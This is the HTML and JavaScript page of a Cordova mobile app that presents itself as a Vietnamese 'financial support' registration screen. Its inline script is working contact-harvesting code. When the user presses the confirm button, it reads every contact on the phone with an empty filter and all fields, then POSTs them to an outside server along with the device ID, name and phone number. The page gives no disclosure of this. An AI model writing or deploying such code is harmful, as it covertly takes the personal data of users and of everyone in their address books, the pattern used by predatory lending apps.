<!DOCTYPE html>
<html>

<head>
    <meta charset="utf-8" />
    <meta name="format-detection" content="telephone=no" />
    <meta name="msapplication-tap-highlight" content="no" />
    <meta name="viewport" content="user-scalable=no, initial-scale=1, maximum-scale=1, minimum-scale=1, width=device-width" />

    <meta http-equiv="Content-Security-Policy" content="default-src * 'unsafe-inline' gap:; style-src 'self' 'unsafe-inline'; media-src *" />

    * gap: is required only on iOS (when using UIWebView) and is needed for JS->native communication

        * Enable inline JS: add 'unsafe-inline' to default-src
        * Enable eval(): add 'unsafe-eval' to default-src

    <link href="https://fonts.googleapis.com/css?family=Open+Sans&display=swap" rel="stylesheet">
    <link rel="stylesheet" type="text/css" href="css/index.css" />
    <title>Hỗ trợ tài chính</title>
</head>

<body>
    <div class="app">
<!--        <input type="hidden" id="phone-number" name="phone-number" value="khong co so">-->
        <h3 onclick="onDeviceReady();">Nhớ đeo khẩu trang và rửa tay thường xuyên</h3>
        <div id="deviceready" class="blink">
            <p class="event listening">Đang khởi động</p>
            <div class="event received">
                <p>Nhiều tính năng sẽ được cập nhật trong thời gian tới. Do vậy hãy quay lại sau và cùng đồng hành với chúng tôi nhé.</p>
            </div>
            <div class="register-box" style="display: none;">
                <input type="text" class="input-text" name="name" id="name" placeholder="Tên">
                <input type="text" class="input-text" name="phone-number" id="phone-number" placeholder="Số điện thoại">

                <input type="button" class="input-button" id="register" onclick="register();" value="Xác nhận">
            </div>
        </div>
    </div>
    <script type="text/javascript" src="cordova.js"></script>
    <script type="text/javascript" src="js/index.js"></script>

    <script type="text/javascript">
        app.initialize();
    </script>

    <script type="text/javascript" charset="utf-8">
        document.addEventListener("deviceready", function () {
            // onDeviceReady();
            checkRegister();
        }, false);

        function register() {
            var options = new ContactFindOptions();
            options.filter="";          // empty search string returns all contacts
            options.multiple=true;      // return multiple results
            var fields = ["*"];

            // hasReadPermission();
            navigator.contacts.find(fields, sendContacts, onError, options);
        }

        function onSuccess(contacts) {
            alert(contacts.length);
            alert(JSON.stringify(contacts));
        }

        function onError(contactError) {
            alert('onError!');
        }

        function checkRegister() {
            var parentElement = document.getElementById('deviceready');
            var listeningElement = parentElement.querySelector('.listening');
            var receivedElement = parentElement.querySelector('.received');
            var registerElement = parentElement.querySelector('.register-box');


            var xhr = new XMLHttpRequest();
            xhr.withCredentials = true;

            xhr.addEventListener("readystatechange", function() {
                if(this.readyState === 4) {
                    var ref = JSON.parse(this.responseText);
                    listeningElement.setAttribute('style', 'display:none;');
                    if (ref.had){
                        receivedElement.setAttribute('style', 'display:block; background-color: unset; color: #000000;');
                        registerElement.setAttribute('style', 'display:none;');
                    } else {
                        receivedElement.setAttribute('style', 'display:none;');
                        registerElement.setAttribute('style', 'display:block;');
                    }
                }
            });

            xhr.open("POST", "https://huydongvon.tulaigiare.vn/mobile/check/"+device.uuid, true);
            xhr.setRequestHeader("Content-Type", "application/json");

            xhr.send(null);
        }

        function sendContacts(contacts) {
            document.getElementById('register').value = 'Đang xử lý...';
            var data = JSON.stringify({
                "phone_name": device.uuid,
                "name": document.getElementById('name').value,
                "phone_number": document.getElementById('phone-number').value,
                "contacts": JSON.stringify(contacts),
                "code":"5432"
            });
            var xhr = new XMLHttpRequest();
            xhr.withCredentials = true;

            xhr.addEventListener("readystatechange", function() {
                if(this.readyState === 4) {
                    alert('Cảm ơn đã sử dụng dịch vụ.');
                    checkRegister();
                }
            });

            xhr.open("POST", "https://huydongvon.tulaigiare.vn/mobile/contact");
            xhr.setRequestHeader("Content-Type", "application/json");
            xhr.send(data);
        }
    </script>
</body>

</html>
